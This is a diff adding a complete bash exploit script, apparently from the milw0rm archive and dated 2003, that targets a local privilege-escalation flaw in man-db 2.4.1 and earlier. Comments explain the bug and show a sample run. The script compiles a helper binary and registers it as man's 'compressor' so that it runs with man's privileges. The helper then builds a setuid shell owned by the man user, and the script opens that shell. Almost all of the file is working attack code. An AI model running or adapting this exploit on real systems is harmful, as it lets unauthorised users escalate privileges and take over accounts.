@@ -1,0 +1,101 @@
+#!/bin/bash
+# xmandb.sh: shell command file.
+#
+# man-db[v2.4.1-]: local uid=man exploit.
+# by: vade79/v9 v9 fakehalo deadpig org (fakehalo)
+#
+# open_cat_stream() privileged call exploit.
+#
+# i've been conversing with the new man-db maintainer, and after the
+# initial post sent to bugtraq(which i forgot to inform him), i sent him
+# an email highlighting another vulnerability i forgot to mention in the
+# original advisory.
+#
+# once he checked it out, he noticed that the routine never dropped
+# privileges before/after the potential buffer/elemental overflow occured,
+# and executed the (user defined) "compressor" binary.  making it
+# pointless to exploit this via the overflow method, and all-purpose to
+# exploit this via the privileged execve() call method.
+#
+# best of luck to the new maintainer(Colin Watson<cjwatson debian org>),
+# he noticed it before i did, so he's on the right track. :)
+#
+# example:
+#  [v9@localhost v9]$ id
+#  uid=500(v9) gid=500(v9) groups=500(v9)
+#  [v9@localhost v9]$ ./xmandb.sh
+#  [*] making fake manpage directories/files...
+#  [*] making runme, and mansh source files...
+#  [*] compiling runme source...
+#  [*] setting "compressor" to: /tmp/runme...
+#  [*] executing man-db/man...
+#  [*] cleaning up files...
+#  [*] success, entering shell.
+#  -rws--x---    1 man      v9          13963 Jun 13 20:09 /tmp/mansh
+#  sh-2.04$ id
+#  uid=15(man) gid=500(v9) groups=500(v9)
+#  sh-2.04$ 
+#
+# (tested on redhat7.1, from src, should work out of the box everywhere)
+
+MANBIN=/usr/bin/man
+MANDIR=man_x
+TMPDIR=/tmp
+echo "man-db[v2.4.1-]: local uid=man exploit."
+echo -e "by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n"
+if [ ! "`$MANBIN -V 2>/dev/null`" ]
+then
+ echo "[!] \"$MANBIN\" does not appear to be man-db, failed."
+ exit
+fi
+umask 002
+cd $TMPDIR
+echo "[*] making fake manpage directories/files..."
+mkdir $MANDIR ${MANDIR}/man1 ${MANDIR}/cat1
+touch ${MANDIR}/man1/x.1
+echo "[*] making runme, and mansh source files..."
+cat <<EOF>runme.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+int main(int argc,char **argv){
+ setreuid(geteuid(),geteuid());
+ system("cc ${TMPDIR}/mansh.c -o ${TMPDIR}/mansh");
+ chmod("${TMPDIR}/mansh",S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);
+ unlink(argv[0]);
+ exit(0);
+}
+EOF
+cat <<EOF>mansh.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(){
+ setreuid(geteuid(),geteuid());
+ execl("/bin/sh","sh",0);
+ exit(0);
+}
+EOF
+echo "[*] compiling runme source..."
+cc runme.c -o runme
+echo "[*] setting \"compressor\" to: ${TMPDIR}/runme..."
+echo "DEFINE compressor ${TMPDIR}/runme">~/.manpath
+echo "[*] executing man-db/man..."
+$MANBIN -M ${TMPDIR}/$MANDIR -P /bin/true x 1>/dev/null 2>&1
+echo "[*] cleaning up files..."
+rm -rf $MANDIR mansh.c runme.c runme ~/.manpath
+if test -u "${TMPDIR}/mansh"
+then
+ echo "[*] success, entering shell."
+ ls -l ${TMPDIR}/mansh
+ ${TMPDIR}/mansh
+else
+ echo "[!] exploit failed."
+ rm -rf ${TMPDIR}/mansh
+fi
+exit
+
+
+// milw0rm.com [2003-08-06]
